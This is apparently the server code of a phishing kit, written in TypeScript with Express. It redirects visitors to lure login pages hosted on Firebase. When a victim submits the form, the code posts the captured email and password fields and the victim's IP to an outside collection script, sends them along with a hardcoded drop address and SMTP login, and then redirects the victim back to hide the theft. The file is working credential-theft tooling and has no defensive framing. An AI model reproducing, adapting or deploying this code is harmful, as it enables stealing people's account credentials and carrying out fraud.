import express, {Request, Response} from 'express';
import axios from 'axios';
import fs from 'fs';
import bodyParser from 'body-parser';
const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const redirectArray: string[] = [
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%2010.html?alt=media&token=930a0752-a0b2-42c0-b14b-47711f0df75d',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%202.html?alt=media&token=3b0c7ca5-cf5e-4ded-b6e5-62b031397548',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%203.html?alt=media&token=116ae969-5917-494b-8b28-c4d4c5b9c849',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%204.html?alt=media&token=117c8f1d-bdd9-4169-a765-ca76d31b30a5',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%205.html?alt=media&token=b3cbd189-3d9b-4695-a908-6de7c4b39828',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%206.html?alt=media&token=4a318039-9719-41f5-be37-bc893e0d6818',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%207.html?alt=media&token=5662f1a2-59dc-4227-ae93-76ba44be9103',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%208.html?alt=media&token=22edbffe-456e-416d-ad85-eab390c6d330',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy%209.html?alt=media&token=da9177e2-86c4-4acb-8704-02ce9df3a02d',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex%20copy.html?alt=media&token=70806436-1eb3-4af0-bbd4-1158501b4ce4',
    'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/owwaa%2Findex.html?alt=media&token=a9db62e0-49c8-462a-a43e-ba0c8e11986b'

]


const 
link = 'https://wertyh.tk/cgi-bin/vendor/send.php',
email = 'alibishopstan@yandex.com',
smtpusername = 'dhl@1carwash.ml',
smtppass = 'ifeanyi12345',
smtpservername = '1carwash.ml',
lastRedirect = '';


// test();
// run $ nodemon index.js
app.get('/test', (req: Request, res: Response) => {
    res.write('<h1> working</h1>');
    res.end();
})
app.get('/', (req: Request, res: Response) => {
    const email = req.query.email;
    const files = fs.readdirSync(__dirname + '/redirects/');
    if (redirectArray.length){
        const rand = Math.floor(Math.random() * redirectArray.length);
        if (email){
            res.redirect(redirectArray[rand] + '&email='+email);
        } else {
            res.redirect(redirectArray[rand]);
        }
    } else{
        const rand = Math.floor(Math.random() * files.length);
        fs.readFile(__dirname + `/redirects/${files[0]}`, 'utf8', (err, text) => {
            res.send(text);
        });
    }
})
app.get('/home', (req: Request, res: Response) => {
    const email = req.query.email;
    const files = fs.readdirSync(__dirname + '/redirects/');
    const rand = Math.floor(Math.random() * files.length);
    fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
        res.send(text);
    });
})
app.post('/', (req: Request, res: Response) => {
    const reff = req.headers.referer || req.headers.referrer;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let redirectUrl = reff + '&error=error&has=jduj733773838cnbncdhg';
    axios.post(link, {
        pet: req.body.pet,
        pett: req.body.pett,
        source: req.body.source.toUpperCase(),
        error: req.body.error,
        ip,
        email,
        smtpusername,
        smtppass,
        smtpservername,
        fromName: req.body.source.toUpperCase() + ' LOGIN'
    }).then((res) => {
        
    }).catch((err) => {
        
    });
    if (req.body.error !== ''){
        redirectUrl = lastRedirect;
        if (!lastRedirect){
            const dom = req.body.pet.split('@')[1];
            redirectUrl = `http://${dom}`;
        }
    }
    res.redirect(redirectUrl);
})
function test(){
    axios.post(link, {
        pet: 'req.body.pet',
        pett: 'req.body.pett',
        source: 'req.body.source.toUpperCase()',
        error: 'req.body.error',
        ip: '546677899',
        email,
        smtpusername,
        smtppass,
        smtpservername,
        fromName: 'req.body.source.toUpperCase()' + ' LOGIN'
    }).then((res) => {
        console.log(res.data);
    }).catch((err) => {
        console.log(err.statusCode);
    });
}

app.listen(process.env.PORT || 5000,() => console.log(`hosting @5000`));